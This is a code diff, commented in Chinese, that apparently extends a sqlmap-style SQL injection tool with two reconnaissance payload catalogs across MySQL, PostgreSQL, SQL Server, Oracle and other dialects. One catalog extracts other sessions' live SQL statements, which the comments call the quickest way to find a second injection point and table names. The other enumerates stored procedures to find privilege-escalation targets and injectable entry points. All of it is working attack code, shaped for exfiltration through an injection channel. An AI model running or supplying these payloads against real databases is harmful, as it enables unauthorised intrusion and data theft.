@@ -334,3 +334,54 @@ SYS_QUERIES.MonetDB = {
   },
 };
 
+
+// ============================================================================
+// [D46 2026-10-11 对标 sqlmap -b/--statements/--procs] 运维侦察查询目录
+//
+// 形状约定（与本文件 SYS_QUERIES 一致）：
+//   · 键为 string/函数 → 用；
+//   · 键为 **null → 该方言结构性不支持，诚实降级**（Extractor 侧 fallback:null，不投无效 SQL）；
+//     绝不用 `|| MySQL` 回落——目标不认识的函数名只会报错 → 判定恒假 → 静默失败。
+//   · 聚合形态与 SYS_QUERIES 同款：单标量返回，行分隔 0x1E/CHR(30)（解析器对齐）。
+//   · **全部带 LIMIT/TOP/ROWNUM 硬上界**：processlist/v$sql/ROUTINES 在业务高峰可能成百上千行，
+//     注入通道上的聚合查询行数失控 = 请求爆炸 + 目标内存压力（本仓「不产出错误 SQL」同族红线）。
+// ============================================================================
+
+// 当前正在执行的 SQL 语句（--statements）：应用在跑什么 = 第二注入点/表名侦察的最快通道
+export const STATEMENTS_QUERY = {
+  MySQL:
+    'SELECT GROUP_CONCAT(CONCAT(id,0x3a,info) SEPARATOR 0x1E) FROM (SELECT id, info FROM information_schema.processlist WHERE info IS NOT NULL AND id <> CONNECTION_ID() ORDER BY id LIMIT 20) __s',
+  MariaDB:
+    'SELECT GROUP_CONCAT(CONCAT(id,0x3a,info) SEPARATOR 0x1E) FROM (SELECT id, info FROM information_schema.processlist WHERE info IS NOT NULL AND id <> CONNECTION_ID() ORDER BY id LIMIT 20) __s',
+  TiDB:
+    'SELECT GROUP_CONCAT(CONCAT(id,0x3a,info) SEPARATOR 0x1E) FROM (SELECT id, info FROM information_schema.processlist WHERE info IS NOT NULL AND id <> CONNECTION_ID() ORDER BY id LIMIT 20) __s',
+  PostgreSQL:
+    "SELECT string_agg(pid::text||CHR(31)||query, CHR(30)) FROM (SELECT pid, query FROM pg_stat_activity WHERE state = 'active' AND pid <> pg_backend_pid() ORDER BY pid LIMIT 20) __s",
+  'SQL Server':
+    "SELECT string_agg(CAST(session_id AS varchar(10))+CHAR(31)+CAST(text AS varchar(4000)), CHAR(30)) FROM (SELECT TOP 20 r.session_id, t.text FROM sys.dm_exec_requests r CROSS APPLY sys.dm_exec_sql_text(r.sql_handle) t WHERE r.session_id <> @@SPID ORDER BY r.session_id) __s",
+  // v$sql 的 sql_text 通常被截断为前 1000 字符（视图列语义），够侦察用
+  Oracle:
+    "SELECT LISTAGG(x, CHR(30)) WITHIN GROUP (ORDER BY x) FROM (SELECT sql_id||CHR(31)||sql_text AS x FROM (SELECT sql_id, sql_text FROM v$sql ORDER BY last_active_time DESC) WHERE ROWNUM <= 20)",
+  SQLite: null, // 无服务端进程概念
+  DM8: null, ClickHouse: null, DB2: null, Sybase: null, Firebird: null,
+  Informix: null, H2: null, Access: null, HSQLDB: null, Derby: null, MonetDB: null,
+};
+
+// 存储过程/函数清单（--procs）：提权侦察（危险过程）+ 可注入过程入口
+export const PROCS_QUERY = {
+  MySQL:
+    'SELECT GROUP_CONCAT(CONCAT(ROUTINE_SCHEMA,0x2e,ROUTINE_NAME,0x28,ROUTINE_TYPE,0x29) SEPARATOR 0x1E) FROM (SELECT ROUTINE_SCHEMA, ROUTINE_NAME, ROUTINE_TYPE FROM information_schema.ROUTINES ORDER BY ROUTINE_SCHEMA, ROUTINE_NAME LIMIT 100) __p',
+  MariaDB:
+    'SELECT GROUP_CONCAT(CONCAT(ROUTINE_SCHEMA,0x2e,ROUTINE_NAME,0x28,ROUTINE_TYPE,0x29) SEPARATOR 0x1E) FROM (SELECT ROUTINE_SCHEMA, ROUTINE_NAME, ROUTINE_TYPE FROM information_schema.ROUTINES ORDER BY ROUTINE_SCHEMA, ROUTINE_NAME LIMIT 100) __p',
+  TiDB:
+    'SELECT GROUP_CONCAT(CONCAT(ROUTINE_SCHEMA,0x2e,ROUTINE_NAME,0x28,ROUTINE_TYPE,0x29) SEPARATOR 0x1E) FROM (SELECT ROUTINE_SCHEMA, ROUTINE_NAME, ROUTINE_TYPE FROM information_schema.ROUTINES ORDER BY ROUTINE_SCHEMA, ROUTINE_NAME LIMIT 100) __p',
+  PostgreSQL:
+    "SELECT string_agg(nspname||CHR(31)||proname||CHR(31)||CASE prokind WHEN 'f' THEN 'func' WHEN 'p' THEN 'proc' WHEN 'a' THEN 'agg' WHEN 'w' THEN 'window' END, CHR(30)) FROM (SELECT n.nspname, p.proname, p.prokind FROM pg_proc p JOIN pg_namespace n ON n.oid = p.pronamespace ORDER BY 1, 2 LIMIT 100) __p",
+  'SQL Server':
+    "SELECT string_agg(ROUTINE_SCHEMA+CHAR(31)+ROUTINE_NAME+CHAR(31)+ROUTINE_TYPE, CHAR(30)) FROM (SELECT TOP 100 ROUTINE_SCHEMA, ROUTINE_NAME, ROUTINE_TYPE FROM INFORMATION_SCHEMA.ROUTINES ORDER BY ROUTINE_SCHEMA, ROUTINE_NAME) __p",
+  Oracle:
+    "SELECT LISTAGG(x, CHR(30)) WITHIN GROUP (ORDER BY x) FROM (SELECT owner||CHR(31)||object_name||CHR(31)||object_type AS x FROM ALL_OBJECTS WHERE object_type IN ('PROCEDURE','FUNCTION','PACKAGE') AND owner NOT IN ('SYS','SYSTEM') ORDER BY owner, object_name) WHERE ROWNUM <= 100",
+  SQLite: null, // 无存储过程概念
+  DM8: null, ClickHouse: null, DB2: null, Sybase: null, Firebird: null,
+  Informix: null, H2: null, Access: null, HSQLDB: null, Derby: null, MonetDB: null,
+};
